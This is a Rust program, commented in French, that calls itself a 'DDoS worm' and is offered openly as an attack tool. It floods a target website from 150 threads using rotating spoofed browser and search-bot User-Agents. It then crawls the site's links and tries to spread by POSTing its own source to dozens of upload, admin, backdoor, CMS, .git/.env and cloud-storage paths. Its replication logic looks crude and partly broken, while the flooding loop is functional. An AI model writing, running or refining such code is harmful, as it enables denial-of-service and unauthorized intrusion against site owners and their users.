use reqwest;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use std::thread;
use std::time::Duration;
use std::fs;
use url::{Url};
use regex::Regex;

// Configuration
const TARGET_URL: &str = "http://victim-website.com"; // Remplacez par votre cible
const THREADS: usize = 150; // Plus de threads = plus de chaos
const CLOUD_TARGETS: bool = true; // Activer l'exploitation des services cloud

// Générateur de noms de fichiers aléatoires
fn random_filename() -> String {
    let rng = thread_rng();
    let filename: String = rng
        .sample_iter(&Alphanumeric)
        .take(10)
        .map(char::from)
        .collect();
    format!("{}.py", filename)
}

// Liste des chemins d'exploitation
const EXPLOIT_PATHS: &[&str] = &[
    // WordPress
    "/wp-admin/install.php",
    "/wp-content/uploads/",
    "/wp-content/plugins/",
    "/wp-content/themes/",
    "/wp-includes/",
    "/wp-config.php",
    // Joomla
    "/administrator/components/",
    "/images/",
    "/tmp/",
    "/cache/",
    "/logs/",
    // Drupal
    "/sites/default/files/",
    "/sites/all/modules/",
    "/sites/all/themes/",
    // Répertoires de téléchargement génériques
    "/uploads/",
    "/files/",
    "/images/",
    "/assets/",
    "/media/",
    "/content/",
    "/data/",
    "/backup/",
    "/temp/",
    "/var/",
    "/storage/",
    // APIs mal configurées
    "/api/upload",
    "/api/files",
    "/api/v1/upload",
    "/api/v2/files",
    "/rest/upload",
    "/graphql/upload",
    // Backdoors courantes
    "/shell.php",
    "/cmd.php",
    "/backdoor.php",
    "/admin.php",
    "/test.php",
    // Fichiers de log (LFI potentiel)
    "/var/log/",
    "/etc/passwd",
    "/proc/self/environ",
    // Contrôle de version Git
    "/.git/",
    "/.svn/",
    "/.env",
    // Sauvegardes de bases de données
    "/backup.sql",
    "/db_backup/",
    "/sql/",
    // Panneaux d'administration
    "/admin/",
    "/login/",
    "/wp-login.php",
    "/administrator/",
    "/manager/html",
    // PHPMyAdmin
    "/phpmyadmin/",
    "/pma/",
    "/mysql/",
    // Stockage Cloud AWS S3
    "http://s3.amazonaws.com/[bucket-name]/",
    "http://[bucket-name].s3.amazonaws.com/",
    // Stockage Blob Azure
    "https://[account].blob.core.windows.net/[container]/",
    "https://[account].file.core.windows.net/[share]/",
    // Stockage Cloud Google
    "https://storage.googleapis.com/[bucket-name]/",
];

// Liste des User-Agents
const USER_AGENTS: [&str; 8] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; Googlebot/2.0; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
];

// Attaque DDoS
fn http_flood(target: &str) {
    let client = reqwest::blocking::Client::new();
    let mut rng = thread_rng();
    loop {
        let user_agent = USER_AGENTS[rng.gen_range(0..USER_AGENTS.len())];
        match client.get(target)
            .header("User-Agent", user_agent)
            .timeout(Duration::from_secs(5))
            .send() {
            Ok(_) => println!("[FLOOD] Request sent to {}", target),
            Err(e) => println!("[FLOOD] Error: {}", e),
        }
        let delay = rng.gen_range(100..1500);
        thread::sleep(Duration::from_millis(delay));
    }
}

// Réplication du ver
fn replicate_worm(target: &str) {
    let client = reqwest::blocking::Client::new();
    let worm_filename = random_filename();
    let worm_content = match fs::read_to_string("main.rs") {
        Ok(content) => content,
        Err(_) => return,
    };

    for path in EXPLOIT_PATHS.iter() {
        let upload_url = if path.starts_with("http") {
            path.to_string()
        } else {
            format!("{}{}{}", target, path, worm_filename)
        };

        if upload_url.starts_with("http") {
            match client.post(&upload_url)
                .body(worm_content.clone())
                .send() {
                Ok(response) if response.status().is_success() => {
                    println!("[WORM] Successfully replicated to {}", upload_url);
                    if !path.starts_with("http") {
                        let execute_url = format!("{}{}", target, path);
                        let _ = client.get(&execute_url).send();
                    }
                },
                Ok(_) | Err(_) => println!("[WORM] Failed to replicate to {}", upload_url),
            }
        }
    }
}

// Découverte de cibles
fn discover_targets(target: &str) -> Vec<String> {
    let client = reqwest::blocking::Client::new();
    let mut targets = Vec::new();
    match client.get(target).send() {
        Ok(response) if response.status().is_success() => {
            let re = Regex::new(r#"href=["'](.*?)["']"#).unwrap();
            let body = match response.text() {
                Ok(text) => text,
                Err(_) => return targets,
            };
            for cap in re.captures_iter(&body) {
                let url = cap.get(1).unwrap().as_str();
                let absolute_url = if url.starts_with("http") {
                    url.to_string()
                } else {
                    match Url::parse(target) {
                        Ok(base_url) => match base_url.join(url) {
                            Ok(joined_url) => joined_url.to_string(),
                            Err(_) => continue,
                        },
                        Err(_) => continue,
                    }
                };
                match Url::parse(&absolute_url) {
                    Ok(parsed_url) => {
                        if parsed_url.host() == Url::parse(target).unwrap().host() {
                            targets.push(absolute_url);
                        }
                    },
                    Err(_) => continue,
                }
            }
            println!("[SCAN] Discovered {} potential targets.", targets.len());
        },
        Ok(_) | Err(_) => println!("[SCAN] Error while discovering targets."),
    }
    targets
}

fn main() {
    println!("[Storm] DDOS Worm Activated. The digital apocalypse has begun.");
    let worm_filename = random_filename();
    println!("[Storm] Worm Filename: {}", worm_filename);

    // Démarrer l'attaque DDoS
    for _ in 0..THREADS {
        let target = TARGET_URL.to_string();
        thread::spawn(move || {
            http_flood(&target);
        });
    }

    // Découvrir de nouvelles cibles
    let new_targets = discover_targets(TARGET_URL);
    for target in new_targets {
        let target_clone = target.clone();
        thread::spawn(move || {
            replicate_worm(&target_clone);
            http_flood(&target_clone);
        });
    }

    // Garder le ver actif indéfiniment
    loop {
        thread::sleep(Duration::from_secs(10));
    }
}
